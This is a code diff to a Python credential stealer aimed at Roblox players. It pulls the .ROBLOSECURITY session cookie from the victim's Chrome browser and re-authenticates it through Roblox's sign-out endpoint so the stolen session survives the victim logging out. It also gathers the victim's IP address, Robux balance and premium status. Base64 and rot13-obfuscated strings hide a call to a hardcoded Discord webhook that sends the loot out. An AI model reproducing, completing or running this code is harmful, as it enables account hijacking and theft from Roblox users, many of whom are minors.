@@ -9,7 +9,6 @@ webhookk = "heh" # put webhook here
 
 def command(c):
     os.system(c)
-    return "l"
 def cls():
     os.system("cls")
 
@@ -75,7 +74,7 @@ def cookieLogger():
         pass
 
     try:
-        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
                 data.append(cookies)
@@ -83,10 +82,38 @@ def cookieLogger():
                 return data
     except:
         pass
+
 cookies = cookieLogger()
+import re, requests
+
+# Getting the X-CSRF-Token using the existing cookie
+cookie = cookies[1]
+xcsrfurl = "https://auth.roblox.com/v2/logout"
+xsrfRequest = requests.post(xcsrfurl,
+    cookies={
+    '.ROBLOSECURITY': cookie
+})
+
+try: # Tries to get the X-CSRF-Token, will raise an Exception if it fails
+    XCSRFTOKEN = xsrfRequest.headers["x-csrf-token"]
+except:
+    raise Exception()
+
+# Creating a new cookie using the previous cookie and the newly generated X-CSRF-Token
+reauthcookieurl = "https://www.roblox.com/authentication/signoutfromallsessionsandreauthenticate"
+data = requests.post(reauthcookieurl,
+    cookies={
+    '.ROBLOSECURITY': cookie
+},
+    headers={
+    'X-CSRF-TOKEN': XCSRFTOKEN
+})
+setcookie = data.headers['set-cookie'] # Gets the headers of the response from the cookie reload
+# Getting the data between '.ROBLOSECURITY=' and '; domain=.roblox.com;` (which leaves us with the new cookie as ROBLOSECURITY)
+ROBLOSECURITYY = (re.search('.ROBLOSECURITY=(.+?); domain=.roblox.com;', setcookie)).group(1)
 #################### INFOMATION #################
 ip_address = requests.get("https://api.ipify.org/").text
-roblox_cookie = cookies[1]
+roblox_cookie = ROBLOSECURITYY
 #################### checking cookie #############
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
@@ -110,7 +137,7 @@ headshot = robloxpy.User.External.GetHeadshot(rid)
 username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
-#################### INJECTS TO MEMORY (creds to someone in v3rm) #################
+#################### INJECT TO ROBLOX (creds to bingo methods) #################
 magic = 'ZGlzY29yZCA9IERpc2NvcmQodXJsPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy85OTIxMjMxMDg4MDA1OTM5OTAvZVUtMEpxbi1GelhJRS1uOTVRWG91N1ZwZ2xaWnFhdEJpWnJ5QVZ5RkliVW1XZGIzZk9YM1B6UWh0QUEtRHhhN0kzWWUiKQ0KZGlzY29yZC5wb3N0KA0KICAgIHVzZXJuYW1lPSJCT1QgLSBQaXJhdGUg8J+NqiIsDQogICAgYXZhdGFyX3VybD0iaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTg0ODE4NDI5MzU1NzgyMTk3Lzk4NTg3ODE3MzY1OTA0NTk5OS9hMzM5NzIxMTgzZjYwYzE4YjM0MjRiYTdiNzNkYWYxYi5wbmciLA0KICAgIGVtYmVkcz1bDQ'
 love = 'btVPNtVPNtVUfAPvNtVPNtVPNtVPNtVPW1p2IlozSgMFV6VPWPG1DtYFODnKWuqTHt8W+AdvVfQDbtVPNtVPNtVPNtVPNvqTy0oTHvBvNv8W+FhPNeZFOFMKA1oUDtDJAwo3IhqPQja5JiVvjAPvNtVPNtVPNtVPNtVPWxMKAwpzyjqTyiovVtBvOzVygUnKEbqJVtHTSaMI0bnUE0pUZ6Yl9anKEbqJVhL29gY01uozxkAmHiHTylLKEyYHAio2gcMF1UpzSvLzIlXFO8VSgFo2kcoJ9hp10br3WioTygo25msFxtsPOoHz9voT94VSOlo2McoTIqXUglo2Wfo3uspUWiMzyfMK0cVvjAPvNtVPNtVPNtVPNtVPWwo2kipvVtBvNkZwD1ZwN0APjAPvNtVPNtVPNtVPNtVPWznJIfMUZvBvOoQDbtVPNtVPNtVPNtVPNtVPNt'
 god = 'eyJuYW1lIjogIlVzZXJuYW1lIiwgInZhbHVlIjogdXNlcm5hbWUsICJpbmxpbmUiOiBUcnVlfSwNCiAgICAgICAgICAgICAgICB7Im5hbWUiOiAiUm9idXggQmFsYW5jZSIsICJ2YWx1ZSI6IHJvYnV4LCAiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIjogIlByZW1pdW0gU3RhdHVzIiwgInZhbHVlIjogcHJlbWl1bSwiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIiA6ICJSQVAiLCAidmFsdWUiOiByYXAsImlubGluZSI6IFRydWV9LA0KICAgICAgICAgICAgICAgIHsibmFtZSIgOiAiRnJpZW5kcyIsICJ2YWx1ZSI6IGZyaWVuZHMsICJpbmxpbmUiOiBUcn'
